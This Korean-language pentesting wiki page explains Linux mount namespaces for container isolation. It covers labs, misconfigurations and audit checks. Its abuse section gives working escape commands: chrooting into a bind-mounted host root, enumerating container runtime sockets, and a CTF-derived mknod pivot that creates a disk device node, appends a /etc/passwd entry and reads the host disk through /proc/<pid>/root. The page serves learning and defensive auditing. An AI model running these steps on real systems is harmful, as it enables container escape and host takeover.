# 마운트 네임스페이스

{{#include ../../../../../banners/hacktricks-training.md}}

## 개요

마운트 네임스페이스는 프로세스가 보는 **마운트 테이블**을 제어합니다. 루트 파일시스템, bind mounts, tmpfs 마운트, procfs 뷰, sysfs 노출, 그리고 많은 런타임별 헬퍼 마운트가 모두 이 마운트 테이블을 통해 표현되기 때문에 컨테이너 격리 기능 중 가장 중요한 것 중 하나입니다. 두 프로세스가 각각 `/`, `/proc`, `/sys`, `/tmp`에 접근할 수 있더라도, 해당 경로들이 무엇으로 해석되는지는 그들이 속한 마운트 네임스페이스에 따라 달라집니다.

컨테이너 보안 관점에서 마운트 네임스페이스는 종종 "깔끔하게 준비된 애플리케이션 파일시스템"과 "이 프로세스가 호스트 파일시스템을 직접 보거나 조작할 수 있음"을 구분하는 차이입니다. 그래서 bind mounts, `hostPath` 볼륨, 권한 있는 마운트 작업, 쓰기 가능한 `/proc` 또는 `/sys` 노출 등이 모두 이 네임스페이스를 중심으로 돌아갑니다.

## 동작

런타임이 컨테이너를 시작할 때 보통 새로운 마운트 네임스페이스를 생성하고, 컨테이너용 루트 파일시스템을 준비하며, 필요에 따라 procfs 및 기타 헬퍼 파일시스템을 마운트한 다음 선택적으로 bind mounts, tmpfs 마운트, secrets, config maps 또는 host paths를 추가합니다. 그 프로세스가 네임스페이스 내부에서 실행되면, 그가 보는 마운트 집합은 호스트의 기본 뷰와 크게 분리됩니다. 호스트는 여전히 실제 기저 파일시스템을 볼 수 있지만, 컨테이너는 런타임이 조립해 준 버전을 보게 됩니다.

이는 컨테이너가 자체 루트 파일시스템을 가진 것처럼 믿게 해 주는 강력한 기능이지만, 런타임이 잘못된 마운트를 노출하면 해당 프로세스가 보안 모델의 나머지가 보호하도록 설계되지 않은 호스트 자원에 대한 가시성을 갑자기 얻을 수 있기 때문에 위험하기도 합니다.

## 실습

다음 명령으로 개인 마운트 네임스페이스를 생성할 수 있습니다:
```bash
sudo unshare --mount --fork bash
mount --make-rprivate /
mkdir -p /tmp/ns-lab
mount -t tmpfs tmpfs /tmp/ns-lab
mount | grep ns-lab
```
해당 namespace 밖에서 다른 셸을 열고 mount table을 확인하면 tmpfs 마운트가 격리된 mount namespace 내부에만 존재한다는 것을 볼 수 있다. 이는 마운트 격리가 추상적인 이론이 아니라 kernel이 프로세스에 실제로 다른 mount table을 제시한다는 것을 보여주기 때문에 유용한 실습이다.

해당 namespace 밖에서 다른 셸을 열어 mount table을 확인하면 tmpfs 마운트는 격리된 mount namespace 내부에만 존재할 것이다.

컨테이너 내부에서는 간단한 비교는 다음과 같다:
```bash
docker run --rm debian:stable-slim mount | head
docker run --rm -v /:/host debian:stable-slim mount | grep /host
```
두 번째 예시는 런타임 설정이 파일시스템 경계에 커다란 구멍을 뚫는 일이 얼마나 쉬운지 보여준다.

## 런타임 사용

Docker, Podman, containerd-based stacks, and CRI-O는 일반 컨테이너에 대해 private 마운트 네임스페이스에 의존한다. Kubernetes는 같은 메커니즘을 기반으로 volumes, projected secrets, config maps, 그리고 `hostPath` 마운트를 구현한다. Incus/LXC 환경도 마운트 네임스페이스에 크게 의존하는데, 특히 system containers가 application containers보다 더 풍부하고 머신과 유사한 파일시스템을 노출하는 경우가 많기 때문이다.

이는 컨테이너 파일시스템 문제를 검토할 때 보통 고립된 Docker의 특이점만 보는 것이 아님을 의미한다. 대신 해당 워크로드를 시작한 플랫폼을 통해 드러나는 마운트 네임스페이스와 런타임 구성 문제를 보고 있는 것이다.

## 잘못된 구성

가장 명백하고 위험한 실수는 host root filesystem이나 다른 민감한 호스트 경로를 bind mount로 노출하는 것이다. 예를 들어 `-v /:/host` 또는 Kubernetes에서 쓰기 가능한 `hostPath` 같은 경우가 그렇다. 그 시점에서 질문은 더 이상 "컨테이너가 어떻게든 탈출할 수 있는가?"가 아니라 "이미 직접 볼 수 있고 쓸 수 있는 유용한 호스트 콘텐츠가 얼마나 있는가?"가 된다. 쓰기 가능한 호스트 bind mount는 종종 나머지 익스플로잇을 파일 배치, chrooting, 구성 변경, 또는 런타임 소켓 발견의 단순한 문제로 바꿔 버린다.

또 다른 흔한 문제는 호스트의 `/proc` 또는 `/sys`를 컨테이너의 더 안전한 뷰를 우회하는 방식으로 노출하는 것이다. 이 파일시스템들은 일반 데이터 마운트가 아니다; 이들은 커널과 프로세스 상태에 대한 인터페이스다. 워크로드가 호스트 버전에 직접 접근하면 컨테이너 보안 강화 뒤에 있던 많은 가정이 더 이상 깔끔하게 적용되지 않는다.

읽기 전용 보호도 중요하다. 읽기 전용 루트 파일시스템이 컨테이너를 마법처럼 안전하게 만드는 것은 아니지만, 공격자의 스테이징 공간을 크게 제거하고 지속성, 헬퍼 바이너리 배치, 구성 조작을 더 어렵게 만든다. 반대로 쓰기 가능한 루트나 쓰기 가능한 호스트 bind mount는 공격자가 다음 단계를 준비할 여지를 제공한다.

## 악용

마운트 네임스페이스가 오용될 때, 공격자는 보통 네 가지 중 하나를 수행한다. 그들은 **컨테이너 외부에 있어야 할 호스트 데이터를 읽는다**. 그들은 **쓰기 가능한 bind mount를 통해 호스트 구성을 수정한다**. 그들은 **capabilities and seccomp가 허용하면 추가 자원을 마운트하거나 재마운트한다**. 또는 그들은 **컨테이너 플랫폼 자체에 더 많은 접근을 요청할 수 있게 해주는 강력한 소켓과 런타임 상태 디렉터리에 접근한다**.

컨테이너가 이미 호스트 파일시스템을 볼 수 있다면, 나머지 보안 모델은 즉시 달라진다.

호스트 bind mount가 의심될 때는 먼저 어떤 것이 사용 가능한지 그리고 그것이 쓰기 가능한지 확인하라:
```bash
mount | grep -E ' /host| /mnt| /rootfs|bind'
find /host -maxdepth 2 -ls 2>/dev/null | head -n 50
touch /host/tmp/ht_test 2>/dev/null && echo "host write works"
```
호스트의 루트 파일시스템이 read-write로 마운트되어 있다면, 호스트에 직접 접근하는 것은 종종 다음처럼 간단합니다:
```bash
ls -la /host
cat /host/etc/passwd | head
chroot /host /bin/bash 2>/dev/null || echo "chroot failed"
```
목표가 직접적인 chrooting이 아니라 privileged runtime access인 경우, sockets와 runtime state를 열거하세요:
```bash
find /host/run /host/var/run -maxdepth 2 -name '*.sock' 2>/dev/null
find /host -maxdepth 4 \( -name docker.sock -o -name containerd.sock -o -name crio.sock \) 2>/dev/null
```
만약 `CAP_SYS_ADMIN`이 있다면, 컨테이너 내부에서 새로운 마운트를 생성할 수 있는지도 테스트하세요:
```bash
mkdir -p /tmp/m
mount -t tmpfs tmpfs /tmp/m 2>/dev/null && echo "tmpfs mount works"
mount -o bind /host /tmp/m 2>/dev/null && echo "bind mount works"
```
### 전체 예제: Two-Shell `mknod` Pivot

컨테이너의 root 사용자가 블록 디바이스를 생성할 수 있고, 호스트와 컨테이너가 유용한 방식으로 사용자 ID를 공유하며 공격자가 이미 호스트에 낮은 권한의 발판을 가지고 있는 경우에 더 특수한 악용 경로가 나타납니다. 그런 상황에서는 컨테이너가 `/dev/sda` 같은 디바이스 노드를 생성할 수 있고, 호스트의 낮은 권한 사용자는 이후 해당 컨테이너 프로세스에 대응하는 `/proc/<pid>/root/`를 통해 이를 읽을 수 있습니다.

컨테이너 내부:
```bash
cd /
mknod sda b 8 0
chmod 777 sda
echo 'augustus:x:1000:1000:augustus:/home/augustus:/bin/bash' >> /etc/passwd
/bin/sh
```
호스트에서, 컨테이너 셸 PID를 찾은 후 해당 저권한 사용자로서:
```bash
ps -auxf | grep /bin/sh
grep -a 'HTB{' /proc/<pid>/root/sda
```
중요한 교훈은 정확한 CTF 문자열 검색 자체가 아니다. 핵심은 mount-namespace가 `/proc/<pid>/root/`를 통해 노출되면, cgroup device policy가 컨테이너 내부에서의 직접 사용을 막았더라도 호스트 사용자가 컨테이너에서 생성된 디바이스 노드를 재사용할 수 있다는 것이다.

## 확인

이 명령들은 현재 프로세스가 실제로 운영 중인 파일시스템 뷰를 보여준다. 목표는 호스트 유래 마운트, 쓰기 가능한 민감한 경로, 그리고 일반적인 애플리케이션 컨테이너 루트 파일시스템보다 더 광범위해 보이는 항목들을 찾아내는 것이다.
```bash
mount                               # Simple mount table overview
findmnt                             # Structured mount tree with source and target
cat /proc/self/mountinfo | head -n 40   # Kernel-level mount details
```
- 호스트에서 온 바인드 마운트(bind mounts), 특히 `/`, `/proc`, `/sys`, 런타임 상태 디렉터리 또는 소켓 위치는 즉시 눈에 띄어야 한다.
- 예상치 못한 읽기-쓰기(read-write) 마운트는 보통 많은 수의 읽기 전용(read-only) 보조 마운트보다 더 중요하다.
- `mountinfo`는 경로가 실제로 호스트 유래인지 오버레이 기반(overlay-backed)인지 확인하기에 종종 가장 좋은 곳이다.

이러한 검사들은 **이 네임스페이스에서 어떤 리소스가 보이는지**, **어떤 리소스가 호스트 유래인지**, 그리고 **그중 어떤 것이 쓰기 가능하거나 보안에 민감한지**를 확인한다.
